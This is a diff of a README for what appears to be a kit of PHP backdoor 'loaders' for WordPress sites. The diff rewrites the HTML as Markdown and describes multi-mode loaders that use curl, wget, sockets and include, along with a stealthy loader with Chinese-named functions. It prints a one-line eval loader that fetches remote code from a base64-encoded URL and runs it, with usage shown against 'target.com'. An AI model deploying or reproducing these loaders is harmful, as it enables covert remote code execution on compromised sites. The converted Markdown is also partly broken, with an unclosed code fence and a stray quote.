@@ -24,40 +24,44 @@
   <div class="section">
     <h2>✨ Available Loaders</h2>
 
-    <h3>1. wp-loader.php</h3>
-    <p><strong>Multi-mode loader panel</strong> with the following modes:</p>
-    <ul>
-      <li><code>curl</code> → Loader using cURL</li>
-      <li><code>curlman</code> → Refactored curl loader</li>
-      <li><code>tmp</code> → Temporary file-based loader</li>
-      <li><code>cache</code> → Loader with cache mechanism</li>
-      <li><code>curlv2</code> → Alternative curl loader</li>
-      <li><code>wget</code> → wget/curl + include method</li>
-      <li><code>socket</code> → Raw socket GET loader</li>
-      <li><code>telegram</code> → Author contact info</li>
-    </ul>
-    <p><strong>Usage:</strong></p>
-    <pre><code>http://target.com/wp-loader.php?mode=curl</code></pre>
+    ### 1. wp-loader.php
 
-    <h3>2. b64loader.php</h3>
-    <p><strong>One-liner base64 loader</strong></p>
-    <ul>
-      <li>Decodes a URL from base64 → fetches → executes via eval</li>
-      <li>Extremely short and stealthy</li>
-    </ul>
-    <p><strong>Example snippet:</strong></p>
-    <pre><code>&lt;?= @eval("?>".file_get_contents(base64_decode("..."))); ?&gt;</code></pre>
+**Multi-mode loader panel** with the following modes:
 
-    <h3>3. loadman.php</h3>
-    <p><strong>Stealth loader with Mandarin style</strong></p>
-    <ul>
-      <li>Function and variable names in Chinese characters (汉字)</li>
-      <li>Flow: cURL → fallback to file_get_contents → eval</li>
-      <li>Error output: "加载失败 (Failed to load)"</li>
-    </ul>
-    <p><strong>Usage:</strong></p>
-    <pre><code>http://target.com/loadman.php</code></pre>
-  </div>
+-   `curl` → Loader using cURL
+-   `curlman` → Refactored curl loader
+-   `tmp` → Temporary file-based loader
+-   `cache` → Loader with cache mechanism
+-   `curlv2` → Alternative curl loader
+-   `wget` → wget/curl + include method
+-   `socket` → Raw socket GET loader
+-   `telegram` → Author contact info
+
+**Usage:**
+    http://target.com/wp-loader.php?mode=curl
+
+    ### 2. b64loader.php
+
+**One-liner base64 loader**
+
+-   Decodes a URL from base64 → fetches → executes via eval
+-   Extremely short and stealthy
+
+**Example snippet:**
+
+```php
+<?= @eval("?>".file_get_contents(base64_decode("..."))); ?>
+'
+
+     ### 3. loadman.php
+
+**Stealth loader with Mandarin style**
+
+- Function and variable names in Chinese characters (汉字)
+- Flow: `cURL` → fallback to `file_get_contents` → `eval`
+- Error output: "加载失败 (Failed to load)"
+
+**Usage:**
 
   <hr>
 
